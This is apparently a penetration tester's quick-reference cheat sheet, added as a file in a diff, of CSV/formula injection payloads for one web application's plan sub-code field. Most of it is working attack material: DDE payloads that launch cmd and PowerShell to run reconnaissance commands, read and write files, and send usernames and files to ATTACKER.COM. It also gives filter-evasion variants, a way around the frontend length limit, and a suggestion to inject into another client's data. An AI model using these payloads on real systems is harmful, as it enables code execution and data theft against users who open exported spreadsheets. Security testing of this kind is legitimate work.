@@ -1,0 +1,247 @@
+===================================================================================
+QUICK PAYLOAD REFERENCE - COPY & PASTE INTO BURP REPEATER
+===================================================================================
+
+HOW TO USE:
+1. In Burp Repeater, find: AddEditPlanSubCode.PlanSubCodeKey=
+2. Replace the value with one of the payloads below
+3. Send the request
+4. Check: Status 200 OK? (means accepted)
+
+===================================================================================
+LEVEL 1: BASIC FORMULAS (Test These First - Lowest Risk)
+===================================================================================
+
+PAYLOAD 1A - Simple Addition:
+=1%2B1
+
+PAYLOAD 1B - Multiple Operations (Tests Length Bypass):
+=1%2B1%2B1%2B1%2B1
+
+PAYLOAD 1C - Multiplication:
+=7*7
+
+PAYLOAD 1D - String Concatenation:
+="Hello"%26"World"
+
+===================================================================================
+LEVEL 2: PROOF OF CONCEPT - CODE EXECUTION (Medium Risk)
+===================================================================================
+
+PAYLOAD 2A - Opens Calculator:
+=cmd%7C%27%2Fc+calc%27%21A1
+
+PAYLOAD 2B - Opens Notepad:
+=cmd%7C%27%2Fc+notepad%27%21A1
+
+PAYLOAD 2C - Opens Command Prompt:
+=cmd%7C%27%2Fc+cmd%27%21A1
+
+PAYLOAD 2D - Opens Task Manager:
+=cmd%7C%27%2Fc+taskmgr%27%21A1
+
+===================================================================================
+LEVEL 3: SYSTEM INFORMATION GATHERING (Medium-High Risk)
+===================================================================================
+
+PAYLOAD 3A - Shows Current User:
+=cmd%7C%27%2Fc+whoami%27%21A1
+
+PAYLOAD 3B - System Information:
+=cmd%7C%27%2Fc+systeminfo%27%21A1
+
+PAYLOAD 3C - Network Configuration:
+=cmd%7C%27%2Fc+ipconfig%27%21A1
+
+PAYLOAD 3D - List Users:
+=cmd%7C%27%2Fc+net+user%27%21A1
+
+PAYLOAD 3E - List Network Shares:
+=cmd%7C%27%2Fc+net+share%27%21A1
+
+PAYLOAD 3F - Directory Listing:
+=cmd%7C%27%2Fc+dir+C:%5C%27%21A1
+
+===================================================================================
+LEVEL 4: FILE OPERATIONS (High Risk)
+===================================================================================
+
+PAYLOAD 4A - Create File:
+=cmd%7C%27%2Fc+powershell+%22New-Item+-Path+C:%5CWindows%5CTemp%5Cpwned.txt+-ItemType+File%22%27%21A1
+
+PAYLOAD 4B - Write to File:
+=cmd%7C%27%2Fc+powershell+%22Add-Content+-Path+C:%5CWindows%5CTemp%5Cdata.txt+-Value+%27Hacked%27%22%27%21A1
+
+PAYLOAD 4C - Read File:
+=cmd%7C%27%2Fc+powershell+%22Get-Content+C:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%22%27%21A1
+
+===================================================================================
+LEVEL 5: DATA EXFILTRATION (Critical Risk - Requires Attacker Server)
+===================================================================================
+
+PAYLOAD 5A - HTTP GET Exfiltration (Replace ATTACKER.COM):
+=IMPORTXML(%22http://ATTACKER.COM/exfil?data=test%22,%22//a%22)
+
+PAYLOAD 5B - PowerShell HTTP Request:
+=cmd%7C%27%2Fc+powershell+%22Invoke-WebRequest+-Uri+http://ATTACKER.COM/exfil?user=$env:USERNAME%22%27%21A1
+
+PAYLOAD 5C - Send File to Attacker:
+=cmd%7C%27%2Fc+powershell+%22Invoke-WebRequest+-Uri+http://ATTACKER.COM/upload+-InFile+C:%5CWindows%5CTemp%5Cpwned.txt%22%27%21A1
+
+===================================================================================
+LEVEL 6: BYPASS & EVASION TECHNIQUES
+===================================================================================
+
+PAYLOAD 6A - Whitespace Bypass:
+=cmd%7C%27%2Fc++++calc%27%21A1
+
+PAYLOAD 6B - Case Variation:
+=CMD%7C%27%2Fc+CALC%27%21A1
+
+PAYLOAD 6C - With Quotes:
+=cmd%7C%27%2Fc+%22calc.exe%22%27%21A1
+
+===================================================================================
+TESTING ORDER (RECOMMENDED)
+===================================================================================
+
+STEP 1: Start with basics
+[ ] =1%2B1
+[ ] =1%2B1%2B1%2B1%2B1
+[ ] =7*7
+
+STEP 2: If basic formulas work, try code execution proof
+[ ] =cmd%7C%27%2Fc+calc%27%21A1
+[ ] =cmd%7C%27%2Fc+notepad%27%21A1
+[ ] =cmd%7C%27%2Fc+whoami%27%21A1
+
+STEP 3: If code execution works, try system info
+[ ] =cmd%7C%27%2Fc+systeminfo%27%21A1
+[ ] =cmd%7C%27%2Fc+ipconfig%27%21A1
+
+STEP 4: If all above work, document as CRITICAL RCE vulnerability
+
+===================================================================================
+WHAT TO CHECK AFTER EACH PAYLOAD:
+===================================================================================
+
+1. Response Status Code:
+   - 200 OK = Payload accepted (vulnerable!)
+   - 400/422 = Validation error (secure)
+
+2. In Browser, refresh Plan Sub Codes page:
+   - Is your payload visible in the table?
+   - Example: See "=cmd|'/c calc'!A1" listed?
+
+3. Export & Test (if export function exists):
+   - Download as CSV
+   - Open in Excel
+   - Does calculator open? (if using calc payload)
+
+4. Document Results:
+   - Screenshot of accepted payload
+   - Screenshot of formula in table
+   - Screenshot of export/execution
+
+===================================================================================
+EXPECTED OUTCOMES:
+===================================================================================
+
+IF VULNERABLE:
+✓ All payloads return 200 OK
+✓ Payloads appear in Plan Sub Codes table
+✓ Formula executes when exported to Excel
+✓ Code executes on server/client
+
+SEVERITY: 🔴 CRITICAL RCE
+
+IF NOT VULNERABLE:
+✗ Payloads return 400/422 error
+✗ Validation error in response
+✗ Payloads not stored in database
+
+SEVERITY: ✅ NOT VULNERABLE
+
+===================================================================================
+IMPORTANT NOTES:
+===================================================================================
+
+⚠️ AUTHORIZATION TEST:
+After getting payloads to work with your client (Bank of America),
+test if you can inject formulas into OTHER client's data (zE2E20260316):
+- If YES: CROSS-CLIENT FORMULA INJECTION (even worse)
+- Document this as separate finding
+
+⚠️ URL ENCODING:
+Space = +
+| = %7C
+' = %27  (but %27 shown as %27 in text)
+/ = %2F
+! = %21
+" = %22
+& = %26
+\ = %5C
+: = %3A
+= = %3D
+
+⚠️ DON'T FORGET:
+- Get proper authorization before testing
+- Document everything
+- Test in non-production first
+- Don't execute deletion commands
+
+===================================================================================
+IN CASE FRONTEND BLOCKS YOU:
+===================================================================================
+
+If you see error: "Maximum length exceeded" or similar:
+
+Use Burp Repeater to bypass:
+1. Type short formula in browser: =1+1
+2. Capture request in Burp
+3. Change to long payload in Burp body
+4. Send request
+5. Frontend restriction bypassed!
+
+===================================================================================
+STEP-BY-STEP BURP USAGE:
+===================================================================================
+
+1. Right-click SavePlanSubCode request → Send to Repeater
+
+2. In Repeater tab, find this in the body:
+   &AddEditPlanSubCode.PlanSubCodeKey=1%2B1%29%28OBJECTCLASS%3D*
+
+3. Replace entire parameter value with payload from above:
+   &AddEditPlanSubCode.PlanSubCodeKey=[PAYLOAD_HERE]
+
+4. Click Send button
+
+5. Check Response panel:
+   - Look for "200 OK" at top
+   - If 200: Payload was accepted!
+
+6. Go back to browser and refresh Plan Sub Codes page
+
+7. Look for your injected formula in the table
+
+===================================================================================
+EXAMPLE - STEP BY STEP:
+===================================================================================
+
+ORIGINAL REQUEST BODY:
+...&AddEditPlanSubCode.PlanSubCodeKey=1%2B1%29%28OBJECTCLASS%3D*&...
+
+CHANGE TO (with calc payload):
+...&AddEditPlanSubCode.PlanSubCodeKey==cmd%7C%27%2Fc+calc%27%21A1&...
+
+SEND IN BURP → Check "200 OK" in response
+
+GO TO BROWSER → Refresh page → See "=cmd|'/c calc'!A1" in table
+
+EXPORT DATA → Open in Excel → Calculator opens
+
+===================================================================================
+
+START WITH LEVEL 1 PAYLOADS - Work your way up! 🚀
+
